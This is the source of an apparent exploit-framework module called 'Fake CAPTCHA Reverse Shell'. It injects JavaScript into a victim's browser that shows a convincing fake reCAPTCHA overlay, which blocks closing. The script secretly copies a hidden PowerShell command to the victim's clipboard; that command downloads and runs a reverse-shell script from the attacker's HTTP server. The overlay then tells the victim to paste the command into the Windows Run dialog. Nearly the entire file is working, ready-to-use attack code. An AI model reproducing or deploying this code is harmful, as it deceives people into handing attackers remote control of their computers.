from kittysploit import *
from lib.protocols.http.http_server import Http_server
import json

class Module(BrowserExploit, Http_server):

	__info__ = {
		"name": "Fake CAPTCHA Reverse Shell",
		"description": "Generate a fake CAPTCHA modal that tricks users into executing a PowerShell reverse shell via Win+R (Copy and Paste attack vector). Serves payload via HTTP server.",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.WINDOWS,
		"session_type": SessionType.BROWSER,
		"references": [
			"https://github.com/JohnHammond/recaptcha-phish"
		],
		"payload": {
			"default": "payloads/singles/windows/powershell_reverse_tcp",
			"arch": Arch.X64,
			"category": PayloadCategory.SINGLE,
		}
	}	
	
	url = OptString("", "URL to inject the fake CAPTCHA (empty = current page)", False)
	captcha_id = OptString("6203", "reCAPTCHA Verification ID to display", False)
	http_port = OptPort(8888, "HTTP server port to serve the PowerShell script", False)
	
	ps1_filename = "reverse-shell.ps1"

	def run(self):
		"""Generate and inject a fake CAPTCHA modal that tricks users into executing a reverse shell"""
		
		
		# Convert payload to string
		if isinstance(self.payload, bytes):
			powershell_cmd = self.payload.decode('utf-8', errors='ignore')
		else:
			powershell_cmd = str(self.payload)
		
		# Extract PowerShell script from payload (decode base64 if needed)
		import base64
		import re
		
		# Extract base64 encoded script from -EncodedCommand parameter
		match = re.search(r'-EncodedCommand\s+([A-Za-z0-9+/=]+)', powershell_cmd)
		if match:
			encoded_script = match.group(1)
			decoded_bytes = base64.b64decode(encoded_script)
			ps1_content = decoded_bytes.decode('utf-16le')
		else:
			# If no -EncodedCommand, use payload as-is (might already be a script)
			ps1_content = powershell_cmd
		
		# Configure HTTP server (use http_port option or default to 8888)
		self.srvport = self.http_port if hasattr(self, 'http_port') and self.http_port else 8888
		
		# Get lhost for the download URL
		download_host = self.lhost if hasattr(self, 'lhost') and self.lhost else "127.0.0.1"
		download_port = self.srvport
		download_url = f"http://{download_host}:{download_port}/{self.ps1_filename}"
		
		# Start HTTP server using web_delivery from Http_server
		http_server = None
		try:
			_, _, http_server = self.web_delivery(
				data=ps1_content,
				forever=True,
				background=True,
				path=f"/{self.ps1_filename}"
			)
			http_server_started = True
		except Exception as e:
			print_error(f"Failed to start HTTP server: {e}")
			http_server_started = False
		
		# Create download command
		download_cmd = f'powershell -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'{download_url}\')"'
		
		if not http_server_started:
			print_warning("HTTP server failed to start")
		
		# Escape command for JavaScript
		escaped_download_cmd = json.dumps(download_cmd)
		
		js_code = f"""
		(function() {{
			// Store command in global variable and localStorage for persistence
			const command = {escaped_download_cmd};
			window.ksCaptchaReverseShellCommand = command;
			try {{
				localStorage.setItem('ksCaptchaReverseShellCommand', command);
			}} catch(e) {{
				// localStorage might not be available
			}}
			
			// Function to inject the modal
			function injectModal() {{
				if (!document.body) {{
					return false;
				}}
				
				const existing = document.getElementById('ksCaptchaReverseShellOverlay');
				if (existing) existing.remove();

			// Create enhanced styles
			if (!document.getElementById('ksCaptchaReverseShellStyles')) {{
				const style = document.createElement('style');
				style.id = 'ksCaptchaReverseShellStyles';
				style.textContent = `
					@keyframes kscrs-fadeIn {{
						from {{ opacity: 0; transform: scale(0.96) translateY(-10px); }}
						to {{ opacity: 1; transform: scale(1) translateY(0); }}
					}}
					@keyframes kscrs-slideIn {{
						from {{ opacity: 0; transform: translateY(10px); }}
						to {{ opacity: 1; transform: translateY(0); }}
					}}
					@keyframes kscrs-pulse {{
						0%, 100% {{ transform: scale(1); }}
						50% {{ transform: scale(1.02); }}
					}}
					@keyframes kscrs-checkmark {{
						0% {{ transform: scale(0); opacity: 0; }}
						50% {{ transform: scale(1.2); }}
						100% {{ transform: scale(1); opacity: 1; }}
					}}
					#ksCaptchaReverseShellOverlay {{
						animation: kscrs-fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
					}}
					#ksCaptchaReverseShellCard {{
						animation: kscrs-slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) 0.1s both;
					}}
					.kscrs-key-badge {{
						display: inline-block;
						background: linear-gradient(180deg, #ffffff 0%, #f5f5f5 100%);
						border: 1px solid #d0d0d0;
						box-shadow: 0 1px 2px rgba(0,0,0,0.1), inset 0 1px 0 rgba(255,255,255,0.8);
						padding: 4px 8px;
						border-radius: 4px;
						font-family: 'Segoe UI', 'Consolas', 'Courier New', monospace;
						font-weight: 600;
						font-size: 13px;
						color: #333;
						margin: 0 2px;
						min-width: 24px;
						text-align: center;
						transition: all 0.15s ease;
					}}
					.kscrs-key-badge:hover {{
						background: linear-gradient(180deg, #f8f8f8 0%, #eeeeee 100%);
						box-shadow: 0 2px 4px rgba(0,0,0,0.15), inset 0 1px 0 rgba(255,255,255,0.9);
					}}
				`;
				document.head.appendChild(style);
			}}

			// Create overlay with enhanced backdrop
			const overlay = document.createElement('div');
			overlay.id = 'ksCaptchaReverseShellOverlay';
			overlay.setAttribute('role', 'dialog');
			overlay.setAttribute('aria-modal', 'true');
			overlay.style.cssText = 'position:fixed; inset:0; z-index:2147483647; background:rgba(0,0,0,0.6); display:flex; align-items:center; justify-content:center; backdrop-filter:blur(4px) saturate(180%); -webkit-backdrop-filter:blur(4px) saturate(180%); font-family:"Google Sans","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;';

			// Create modal card with enhanced shadow and design
			const card = document.createElement('div');
			card.id = 'ksCaptchaReverseShellCard';
			card.style.cssText = 'width:440px; max-width:90vw; background:#ffffff; border-radius:12px; padding:0; box-shadow:0 20px 60px rgba(0,0,0,0.3), 0 0 0 1px rgba(0,0,0,0.05); position:relative; overflow:hidden;';

			// Header with gradient and better typography
			const header = document.createElement('div');
			header.style.cssText = 'background:linear-gradient(135deg, #4285f4 0%, #357ae8 100%); color:#ffffff; padding:20px 24px; font-size:17px; font-weight:500; letter-spacing:0.2px; box-shadow:0 2px 4px rgba(0,0,0,0.1); position:relative;';
			header.innerHTML = '<div style="display:flex; align-items:center; gap:8px;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="opacity:0.9;"><path d="M9 11l3 3L22 4"></path><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"></path></svg><span>Complete these Verification Steps</span></div>';

			// Body content with better spacing
			const body = document.createElement('div');
			body.style.cssText = 'padding:28px 24px; background:#ffffff;';

			// Instructions text with better styling
			const instructionsText = document.createElement('div');
			instructionsText.style.cssText = 'font-size:15px; color:#5f6368; margin-bottom:24px; line-height:1.6; font-weight:400;';
			instructionsText.textContent = 'To better prove you are not a robot, please:';

			// Instructions list with enhanced styling
			const instructionsList = document.createElement('ol');
			instructionsList.style.cssText = 'margin:0 0 24px 0; padding-left:28px; font-size:14px; color:#202124; line-height:1.8; counter-reset:step-counter; list-style:none;';

			// Instruction 1
			const step1 = document.createElement('li');
			step1.style.cssText = 'margin-bottom:14px; position:relative; padding-left:8px; counter-increment:step-counter;';
			step1.innerHTML = '<span style="position:absolute; left:-28px; color:#4285f4; font-weight:600; font-size:15px;">1.</span>Press & hold the Windows Key <span class="kscrs-key-badge" style="padding:4px 6px; display:inline-flex; align-items:center; justify-content:center;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:block;"><path d="M3 3h8v8H3V3z" fill="#0078d4"/><path d="M13 3h8v8h-8V3z" fill="#0078d4"/><path d="M3 13h8v8H3v-8z" fill="#0078d4"/><path d="M13 13h8v8h-8v-8z" fill="#0078d4"/></svg></span> + <span class="kscrs-key-badge">R</span>.';

			// Instruction 2
			const step2 = document.createElement('li');
			step2.style.cssText = 'margin-bottom:14px; position:relative; padding-left:8px; counter-increment:step-counter;';
			step2.innerHTML = '<span style="position:absolute; left:-28px; color:#4285f4; font-weight:600; font-size:15px;">2.</span>In the verification window, press <span class="kscrs-key-badge">Ctrl</span> + <span class="kscrs-key-badge">V</span>.';

			// Instruction 3
			const step3 = document.createElement('li');
			step3.style.cssText = 'margin-bottom:14px; position:relative; padding-left:8px; counter-increment:step-counter;';
			step3.innerHTML = '<span style="position:absolute; left:-28px; color:#4285f4; font-weight:600; font-size:15px;">3.</span>Press <span class="kscrs-key-badge">Enter</span> on your keyboard to finish.';

			instructionsList.appendChild(step1);
			instructionsList.appendChild(step2);
			instructionsList.appendChild(step3);

			// Divider
			const divider = document.createElement('div');
			divider.style.cssText = 'height:1px; background:linear-gradient(90deg, transparent, #e8eaed, transparent); margin:24px 0;';

			// Checkbox container with enhanced design
			const checkboxContainer = document.createElement('div');
			checkboxContainer.style.cssText = 'display:flex; align-items:flex-start; margin:20px 0; padding:16px; border-radius:8px; border:2px solid #e8eaed; background:linear-gradient(180deg, #fafbfc 0%, #f8f9fa 100%); cursor:pointer; transition:all 0.25s cubic-bezier(0.4, 0, 0.2, 1); box-shadow:inset 0 1px 2px rgba(0,0,0,0.05);';
			checkboxContainer.onmouseover = function() {{ this.style.borderColor = '#dadce0'; this.style.background = 'linear-gradient(180deg, #f8f9fa 0%, #f1f3f4 100%)'; this.style.boxShadow = 'inset 0 1px 3px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.05)'; }};
			checkboxContainer.onmouseout = function() {{ this.style.borderColor = '#e8eaed'; this.style.background = 'linear-gradient(180deg, #fafbfc 0%, #f8f9fa 100%)'; this.style.boxShadow = 'inset 0 1px 2px rgba(0,0,0,0.05)'; }};

			const checkbox = document.createElement('div');
			checkbox.id = 'ksCaptchaReverseShellCheckbox';
			checkbox.style.cssText = 'width:20px; height:20px; border:2px solid #5f6368; border-radius:4px; margin-right:14px; position:relative; transition:all 0.25s cubic-bezier(0.4, 0, 0.2, 1); background:#ffffff; display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:1px; box-shadow:0 1px 2px rgba(0,0,0,0.1);';

			const checkboxLabel = document.createElement('span');
			checkboxLabel.style.cssText = 'font-size:13px; color:#3c4043; user-select:none; line-height:1.5; flex:1;';
			checkboxLabel.innerHTML = `You will observe and agree: <strong style="color:#202124; font-weight:500;">I am not a robot - reCAPTCHA Verification ID: {self.captcha_id}</strong>`;

			checkboxContainer.appendChild(checkbox);
			checkboxContainer.appendChild(checkboxLabel);

			// Verify button with enhanced design
			const verifyBtn = document.createElement('button');
			verifyBtn.id = 'ksCaptchaReverseShellVerifyBtn';
			verifyBtn.style.cssText = 'width:100%; padding:14px 20px; margin-top:8px; border-radius:6px; border:none; background:linear-gradient(135deg, #4285f4 0%, #357ae8 100%); color:#ffffff; font-size:14px; font-weight:500; cursor:pointer; transition:all 0.25s cubic-bezier(0.4, 0, 0.2, 1); text-transform:uppercase; letter-spacing:0.8px; box-shadow:0 2px 4px rgba(66,133,244,0.3), 0 1px 2px rgba(0,0,0,0.1); position:relative; overflow:hidden;';
			verifyBtn.innerHTML = '<span style="position:relative; z-index:1;">VERIFY</span>';
			verifyBtn.onmouseover = function() {{ 
				this.style.background = 'linear-gradient(135deg, #357ae8 0%, #2b6cd8 100%)'; 
				this.style.boxShadow = '0 4px 8px rgba(66,133,244,0.4), 0 2px 4px rgba(0,0,0,0.15)';
				this.style.transform = 'translateY(-1px)';
			}};
			verifyBtn.onmouseout = function() {{ 
				this.style.background = 'linear-gradient(135deg, #4285f4 0%, #357ae8 100%)'; 
				this.style.boxShadow = '0 2px 4px rgba(66,133,244,0.3), 0 1px 2px rgba(0,0,0,0.1)';
				this.style.transform = 'translateY(0)';
			}};
			verifyBtn.onmousedown = function() {{ this.style.transform = 'translateY(0)'; }};

			let checkboxChecked = false;

			// Checkbox click handler with enhanced animation
			checkboxContainer.addEventListener('click', function(e) {{
				e.preventDefault();
				e.stopPropagation();
				checkboxChecked = !checkboxChecked;
				
				if (checkboxChecked) {{
					checkbox.style.background = 'linear-gradient(135deg, #4285f4 0%, #357ae8 100%)';
					checkbox.style.borderColor = '#4285f4';
					checkbox.style.boxShadow = '0 2px 4px rgba(66,133,244,0.3)';
					checkbox.innerHTML = '<span style="color:#fff; font-size:14px; font-weight:bold; animation:kscrs-checkmark 0.3s cubic-bezier(0.4, 0, 0.2, 1); display:block;">✓</span>';
				}} else {{
					checkbox.style.background = '#ffffff';
					checkbox.style.borderColor = '#5f6368';
					checkbox.style.boxShadow = '0 1px 2px rgba(0,0,0,0.1)';
					checkbox.innerHTML = '';
				}}
			}});

			// Verify button click handler
			verifyBtn.addEventListener('click', function(e) {{
				e.preventDefault();
				e.stopPropagation();
				
				if (!checkboxChecked) {{
					alert('Please check the box to verify you are not a robot.');
					return;
				}}

				// Command is already copied to clipboard when modal appeared
				// Just show success message
				verifyBtn.innerHTML = '<span style="position:relative; z-index:1;">✓ Command Ready!</span>';
				verifyBtn.style.background = 'linear-gradient(135deg, #34a853 0%, #2d8f47 100%)';
				verifyBtn.style.boxShadow = '0 2px 4px rgba(52,168,83,0.3), 0 1px 2px rgba(0,0,0,0.1)';
				
				// Show enhanced success message
				setTimeout(function() {{
					body.style.animation = 'kscrs-slideIn 0.4s ease-out';
					body.innerHTML = '<div style="text-align:center; padding:32px 24px;"><div style="width:64px; height:64px; margin:0 auto 16px; background:linear-gradient(135deg, #34a853 0%, #2d8f47 100%); border-radius:50%; display:flex; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(52,168,83,0.3); animation:kscrs-checkmark 0.5s cubic-bezier(0.4, 0, 0.2, 1);"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div><div style="color:#34a853; font-size:18px; font-weight:500; margin-bottom:8px; letter-spacing:0.2px;">Verification Command Ready</div><div style="color:#5f6368; font-size:14px; line-height:1.6; max-width:320px; margin:0 auto;">The verification command has been copied to your clipboard. Please follow the instructions above to complete verification.</div></div>';
				}}, 600);
			}});

			// Prevent closing by clicking outside (make it look more legitimate)
			overlay.addEventListener('click', function(event) {{
				if (event.target === overlay) {{
					// Don't allow closing by clicking outside
					event.preventDefault();
					event.stopPropagation();
				}}
			}});

			// Prevent ESC key from closing
			window.addEventListener('keydown', function(event) {{
				if (event.key === 'Escape') {{
					event.preventDefault();
					event.stopPropagation();
				}}
			}});

			// Assemble modal
			body.appendChild(instructionsText);
			body.appendChild(instructionsList);
			body.appendChild(divider);
			body.appendChild(checkboxContainer);
			body.appendChild(verifyBtn);
			
			card.appendChild(header);
			card.appendChild(body);
			overlay.appendChild(card);
			document.body.appendChild(overlay);
			console.log('[Fake CAPTCHA Debug] Modal injected, command length:', command.length);
			console.log('[Fake CAPTCHA Debug] Command preview:', command.substring(0, 100) + '...');

			// Function to copy to clipboard - uses execCommand as primary method (more reliable)
			function copyToClipboard(text) {{
				console.log('[Fake CAPTCHA Debug] copyToClipboard called, text length:', text ? text.length : 0);
				console.log('[Fake CAPTCHA Debug] document.hasFocus:', document.hasFocus ? document.hasFocus() : 'N/A');
				console.log('[Fake CAPTCHA Debug] document.activeElement:', document.activeElement ? document.activeElement.tagName : 'N/A');
				
				let success = false;
				
				// Method 1: Try execCommand (works in more contexts, including HTTP)
				console.log('[Fake CAPTCHA Debug] Attempting execCommand method...');
				const textArea = document.createElement('textarea');
				textArea.value = text;
				textArea.readOnly = true;
				textArea.style.position = 'fixed';
				textArea.style.top = '0';
				textArea.style.left = '0';
				textArea.style.width = '1px';
				textArea.style.height = '1px';
				textArea.style.padding = '0';
				textArea.style.margin = '0';
				textArea.style.border = 'none';
				textArea.style.outline = 'none';
				textArea.style.boxShadow = 'none';
				textArea.style.background = 'transparent';
				textArea.style.opacity = '0.01';
				textArea.style.pointerEvents = 'none';
				textArea.setAttribute('aria-hidden', 'true');
				textArea.setAttribute('tabindex', '-1');
				
				console.log('[Fake CAPTCHA Debug] Textarea created, appending to body...');
				document.body.appendChild(textArea);
				console.log('[Fake CAPTCHA Debug] Textarea appended, textArea.value length:', textArea.value ? textArea.value.length : 0);
				
				// Focus and select
				console.log('[Fake CAPTCHA Debug] Attempting to focus textarea...');
				try {{
					textArea.focus();
					console.log('[Fake CAPTCHA Debug] Focus called, document.activeElement:', document.activeElement ? document.activeElement.tagName : 'N/A');
				}} catch (err) {{
					console.error('[Fake CAPTCHA Debug] Focus error:', err);
				}}
				
				console.log('[Fake CAPTCHA Debug] Attempting to select text...');
				try {{
					textArea.select();
					console.log('[Fake CAPTCHA Debug] Select called, selection:', textArea.selectionStart, '-', textArea.selectionEnd);
				}} catch (err) {{
					console.error('[Fake CAPTCHA Debug] Select error:', err);
				}}
				
				console.log('[Fake CAPTCHA Debug] Attempting setSelectionRange...');
				try {{
					textArea.setSelectionRange(0, text.length);
					console.log('[Fake CAPTCHA Debug] setSelectionRange called, selection:', textArea.selectionStart, '-', textArea.selectionEnd);
				}} catch (err) {{
					console.error('[Fake CAPTCHA Debug] setSelectionRange error:', err);
				}}
				
				console.log('[Fake CAPTCHA Debug] Attempting execCommand("copy")...');
				try {{
					success = document.execCommand('copy');
					console.log('[Fake CAPTCHA Debug] execCommand("copy") result:', success);
				}} catch (err) {{
					console.error('[Fake CAPTCHA Debug] execCommand("copy") error:', err);
					console.error('[Fake CAPTCHA Debug] execCommand error details:', err.message, err.name);
					success = false;
				}}
				
				// Clean up
				console.log('[Fake CAPTCHA Debug] Removing textarea from DOM...');
				document.body.removeChild(textArea);
				
				// Method 2: If execCommand failed, try Clipboard API
				if (!success) {{
					console.log('[Fake CAPTCHA Debug] execCommand failed, trying Clipboard API...');
					console.log('[Fake CAPTCHA Debug] navigator.clipboard available:', !!navigator.clipboard);
					console.log('[Fake CAPTCHA Debug] navigator.clipboard.writeText available:', !!(navigator.clipboard && navigator.clipboard.writeText));
					
					if (navigator.clipboard && navigator.clipboard.writeText) {{
						try {{
							console.log('[Fake CAPTCHA Debug] Calling navigator.clipboard.writeText...');
							navigator.clipboard.writeText(text).then(function() {{
								console.log('[Fake CAPTCHA Debug] Clipboard API writeText SUCCESS');
								success = true;
							}}).catch(function(err) {{
								console.error('[Fake CAPTCHA Debug] Clipboard API writeText FAILED:', err);
								console.error('[Fake CAPTCHA Debug] Clipboard error details:', err.message, err.name);
							}});
						}} catch (err) {{
							console.error('[Fake CAPTCHA Debug] Clipboard API not available or error:', err);
						}}
					}} else {{
						console.log('[Fake CAPTCHA Debug] Clipboard API not available');
					}}
				}} else {{
					console.log('[Fake CAPTCHA Debug] execCommand SUCCESS - copy completed');
				}}
				
				console.log('[Fake CAPTCHA Debug] copyToClipboard returning success:', success);
				return success;
			}}
			
			// Set up event listeners to copy when user interacts with the page
			// Clipboard operations require user interaction, so we wait for it
			let copyAttempted = false;
			console.log('[Fake CAPTCHA Debug] Initialized copyAttempted = false');
			
			function attemptCopyOnInteraction(event) {{
				console.log('[Fake CAPTCHA Debug] attemptCopyOnInteraction called');
				console.log('[Fake CAPTCHA Debug] Event type:', event ? event.type : 'N/A');
				console.log('[Fake CAPTCHA Debug] Event target:', event && event.target ? event.target.tagName : 'N/A');
				console.log('[Fake CAPTCHA Debug] copyAttempted before check:', copyAttempted);
				
				if (copyAttempted) {{
					console.log('[Fake CAPTCHA Debug] Copy already attempted, returning early');
					return;
				}}
				
				console.log('[Fake CAPTCHA Debug] Setting copyAttempted = true');
				copyAttempted = true;
				
				// Try to copy immediately (within the user interaction event)
				// Use requestAnimationFrame to ensure we're still in the interaction context
				console.log('[Fake CAPTCHA Debug] Scheduling copy via requestAnimationFrame...');
				requestAnimationFrame(function() {{
					console.log('[Fake CAPTCHA Debug] requestAnimationFrame callback executed');
					console.log('[Fake CAPTCHA Debug] Calling copyToClipboard (attempt 1)...');
					const result1 = copyToClipboard(command);
					console.log('[Fake CAPTCHA Debug] First copy attempt result:', result1);
					
					// Try again after a very short delay as fallback
					setTimeout(function() {{
						console.log('[Fake CAPTCHA Debug] setTimeout callback executed (attempt 2)');
						console.log('[Fake CAPTCHA Debug] Calling copyToClipboard (attempt 2)...');
						const result2 = copyToClipboard(command);
						console.log('[Fake CAPTCHA Debug] Second copy attempt result:', result2);
					}}, 50);
				}});
			}}
			
			// Listen for various user interactions that will trigger clipboard copy
			// Use capture phase to catch events early, but only once per event type
			console.log('[Fake CAPTCHA Debug] Setting up event listeners on document...');
			const eventTypes = ['click', 'mousedown', 'keydown', 'touchstart', 'pointerdown'];
			eventTypes.forEach(function(eventType) {{
				console.log('[Fake CAPTCHA Debug] Adding document listener for:', eventType);
				document.addEventListener(eventType, function(e) {{
					console.log('[Fake CAPTCHA Debug] Document event triggered:', eventType);
					attemptCopyOnInteraction(e);
				}}, {{ capture: true, once: true, passive: true }});
			}});
			
			// Also try when modal elements are clicked/interacted with
			console.log('[Fake CAPTCHA Debug] Setting up event listeners on modal elements...');
			overlay.addEventListener('click', function(e) {{
				console.log('[Fake CAPTCHA Debug] Overlay click event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			overlay.addEventListener('mousedown', function(e) {{
				console.log('[Fake CAPTCHA Debug] Overlay mousedown event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			checkboxContainer.addEventListener('click', function(e) {{
				console.log('[Fake CAPTCHA Debug] CheckboxContainer click event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			checkboxContainer.addEventListener('mousedown', function(e) {{
				console.log('[Fake CAPTCHA Debug] CheckboxContainer mousedown event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			verifyBtn.addEventListener('click', function(e) {{
				console.log('[Fake CAPTCHA Debug] VerifyBtn click event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			verifyBtn.addEventListener('mousedown', function(e) {{
				console.log('[Fake CAPTCHA Debug] VerifyBtn mousedown event triggered');
				attemptCopyOnInteraction(e);
			}}, {{ capture: true, once: true, passive: true }});
			
			// Try when modal first appears (if document has focus)
			// This helps if the user is already interacting with the page
			console.log('[Fake CAPTCHA Debug] Setting up delayed copy attempt...');
			setTimeout(function() {{
				console.log('[Fake CAPTCHA Debug] Delayed copy attempt timeout fired');
				console.log('[Fake CAPTCHA Debug] copyAttempted:', copyAttempted);
				console.log('[Fake CAPTCHA Debug] document.hasFocus:', document.hasFocus ? document.hasFocus() : 'N/A');
				
				if (!copyAttempted && document.hasFocus && document.hasFocus()) {{
					console.log('[Fake CAPTCHA Debug] Document has focus, attempting copy...');
					// Try to trigger copy by simulating a focus event on the modal
					card.setAttribute('tabindex', '-1');
					card.focus();
					setTimeout(function() {{
						console.log('[Fake CAPTCHA Debug] Card focus timeout fired, copyAttempted:', copyAttempted);
						if (!copyAttempted) {{
							console.log('[Fake CAPTCHA Debug] Attempting copy after card focus...');
							const result = copyToClipboard(command);
							console.log('[Fake CAPTCHA Debug] Delayed copy result:', result);
						}}
					}}, 10);
				}} else {{
					console.log('[Fake CAPTCHA Debug] Delayed copy skipped - copyAttempted:', copyAttempted, 'hasFocus:', document.hasFocus ? document.hasFocus() : 'N/A');
				}}
			}}, 200);
			
			console.log('[Fake CAPTCHA Debug] All event listeners set up, waiting for user interaction...');
			
			return true;
			}}
			
			// Try to inject immediately
			if (!injectModal()) {{
				// If document.body is not ready, wait for it
				let injected = false;
				
				// Strategy 1: Wait for DOMContentLoaded
				if (document.readyState === 'loading') {{
					document.addEventListener('DOMContentLoaded', function() {{
						if (!injected) {{
							injected = injectModal();
						}}
					}});
				}}
				
				// Strategy 2: Wait for window.load
				window.addEventListener('load', function() {{
					if (!injected) {{
						injected = injectModal();
					}}
				}});
				
				// Strategy 3: Polling fallback (check every 100ms for up to 10 seconds)
				let attempts = 0;
				const maxAttempts = 100;
				const pollInterval = setInterval(function() {{
					attempts++;
					if (injected || attempts >= maxAttempts) {{
						clearInterval(pollInterval);
						return;
					}}
					
					if (document.body && !injected) {{
						injected = injectModal();
						if (injected) {{
							clearInterval(pollInterval);
						}}
					}}
				}}, 100);
			}}
			
			return 'Fake CAPTCHA Reverse Shell injection initiated';
		}})();
		"""
		
		# If URL is specified, redirect first
		import time
		if self.url:
			redirect_js = f"window.location.href = '{self.url}';"
			self.send_js(redirect_js)
			# Wait a bit for redirect
			time.sleep(1)
		
		# Inject the fake CAPTCHA modal
		result = self.send_js(js_code)
		
		if result:
			print_success("Fake CAPTCHA Reverse Shell modal injected successfully!")
			if http_server_started:
				print_success(f"HTTP server serving PowerShell script at: {download_url}")
			return True
		else:
			print_error("Failed to inject fake CAPTCHA Reverse Shell modal")
			if http_server_started and http_server:
				self.web_shutdown(http_server)
			return False
